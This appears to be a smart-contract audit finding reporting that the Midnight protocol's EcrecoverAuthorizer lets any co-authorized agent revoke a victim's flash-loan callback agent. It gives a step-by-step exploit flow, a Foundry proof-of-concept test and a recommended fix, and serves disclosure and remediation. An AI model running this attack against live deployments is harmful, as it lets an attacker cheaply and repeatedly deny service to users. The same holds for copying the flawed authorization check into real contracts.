### Title
Co-authorized agent can deauthorize flash loan callback agent via EcrecoverAuthorizer - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any agent already authorized by the victim in `Midnight`, treating co-authorized agents as fully equivalent to the victim/authorizer. This allows an attacker who holds any authorization from the victim to sign and submit an `Authorization` struct that sets `isAuthorized=false` for the victim's flash loan callback agent, permanently breaking flash-loan-based atomic repay/take operations until the victim re-authorizes.

### Finding Description
**Root cause — `EcrecoverAuthorizer.sol:33-36`:**

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

Any EOA `signer` for whom `isAuthorized[victim][signer] == true` passes this check. The function then unconditionally calls:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
``` [1](#0-0) 

`Midnight.setIsAuthorized` itself also permits any authorized agent to modify any authorization entry for the victim:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
``` [2](#0-1) 

There is no restriction preventing an authorized agent from targeting a *different* authorized agent as the `authorized` field with `isAuthorized=false`.

**Exploit flow (exact preconditions → trigger → bad state):**

Preconditions:
- `victim` has called `Midnight.setIsAuthorized(ecrecoverAuthorizer, true, victim)` — required for `EcrecoverAuthorizer` to act on victim's behalf at all.
- `victim` has called `Midnight.setIsAuthorized(flashLoanAgent, true, victim)` — the callback contract used in atomic repay/take flash loans.
- `victim` has called `Midnight.setIsAuthorized(attacker, true, victim)` — attacker is a co-authorized EOA.

Attack steps:
1. Attacker reads `ecrecoverAuthorizer.nonce(victim)` → `N` (public storage).
2. Attacker constructs `Authorization { authorizer: victim, authorized: flashLoanAgent, isAuthorized: false, nonce: N, deadline: block.timestamp + 1 }`.
3. Attacker signs the EIP-712 digest with their own private key → `sig`.
4. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`.
5. `ecrecover` returns `attacker`; `isAuthorized[victim][attacker] == true` → check passes.
6. `Midnight.setIsAuthorized(flashLoanAgent, false, victim)` executes; `isAuthorized[victim][ecrecoverAuthorizer] == true` → check passes.
7. `isAuthorized[victim][flashLoanAgent]` is now `false`.

Consequence: any subsequent call to `Midnight.repay(market, units, victim, ...)` or `Midnight.take(...)` from inside `flashLoanAgent.onFlashLoan` hits:

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
``` [3](#0-2) 

and reverts with `Unauthorized()`, which propagates out of `onFlashLoan`, causing `flashLoan` to revert with `WrongFlashLoanCallbackReturnValue()`. [4](#0-3) 

No existing check stops this: the nonce is public, the deadline is attacker-controlled, and the only authorization guard in `EcrecoverAuthorizer` is the co-authorization check that the attacker already satisfies.

### Impact Explanation
Any victim who relies on a flash-loan callback agent (e.g., a contract that atomically borrows, repays, or takes on the victim's behalf) and who has also granted authorization to any other EOA is vulnerable. The attacker can permanently disable the flash loan workflow at zero cost beyond gas, causing all `flashLoan`-based `repay` or `take` operations for that victim to revert. The victim must re-authorize `flashLoanAgent`, but the attacker can immediately repeat the deauthorization, creating a sustained, cheap DoS.

### Likelihood Explanation
Preconditions are realistic: users of `EcrecoverAuthorizer` must authorize it in `Midnight`, and protocols commonly authorize multiple agents (e.g., a router, a keeper, and a flash loan callback contract). The attacker only needs to be one of those agents. The attack is permissionless, costs only gas, is repeatable every time the victim re-authorizes, and requires no special timing beyond reading the current nonce from public state.

### Recommendation
In `EcrecoverAuthorizer.setIsAuthorized`, restrict the signer to be exactly `authorization.authorizer` — do not accept co-authorized agents as valid signers. The EIP-712 signature already proves the authorizer's intent; delegating signing power to co-authorized agents is the root cause:

```solidity
// Replace lines 33-36 with:
require(signer == authorization.authorizer, Unauthorized());
```

If delegation is intentional, add a separate field (e.g., `address signer`) to the `Authorization` struct and require that `authorization.authorizer` explicitly names the permitted delegate, preventing any co-authorized agent from acting unilaterally.

### Proof of Concept
```solidity
// Foundry unit test
function testAttackerDeauthorizesFlashLoanAgent() public {
    address victim = makeAddr("victim");
    address flashLoanAgent = makeAddr("flashLoanAgent"); // callback contract
    (address attacker, uint256 attackerKey) = makeAddrAndKey("attacker");

    // Victim sets up: authorize ecrecoverAuthorizer, flashLoanAgent, and attacker
    vm.startPrank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    midnight.setIsAuthorized(flashLoanAgent, true, victim);
    midnight.setIsAuthorized(attacker, true, victim);
    vm.stopPrank();

    // Assert flashLoanAgent is authorized before attack
    assertTrue(midnight.isAuthorized(victim, flashLoanAgent));

    // Attacker constructs deauthorization for flashLoanAgent, signed by attacker
    Authorization memory auth = Authorization({
        authorizer: victim,
        authorized: flashLoanAgent,
        isAuthorized: false,
        nonce: ecrecoverAuthorizer.nonce(victim), // = 0, public
        deadline: block.timestamp + 1 days
    });
    bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
    bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
    bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);
    Signature memory sig = Signature({v: v, r: r, s: s});

    // Attacker submits — no revert expected
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // Assert flashLoanAgent is now deauthorized
    assertFalse(midnight.isAuthorized(victim, flashLoanAgent));

    // Assert: any repay call from flashLoanAgent on behalf of victim now reverts
    vm.prank(flashLoanAgent);
    vm.expectRevert(IMidnight.Unauthorized.selector);
    midnight.repay(market, 1, victim, address(0), hex"");
}
```

Expected assertions: `isAuthorized(victim, flashLoanAgent)` transitions from `true` to `false` after the attacker's call; the subsequent `repay` from `flashLoanAgent` reverts with `Unauthorized`.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-47)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/Midnight.sol (L505-505)
```text
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```

**File:** src/Midnight.sol (L731-734)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
```

**File:** src/Midnight.sol (L745-748)
```text
        require(
            IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
            WrongFlashLoanCallbackReturnValue()
        );
```
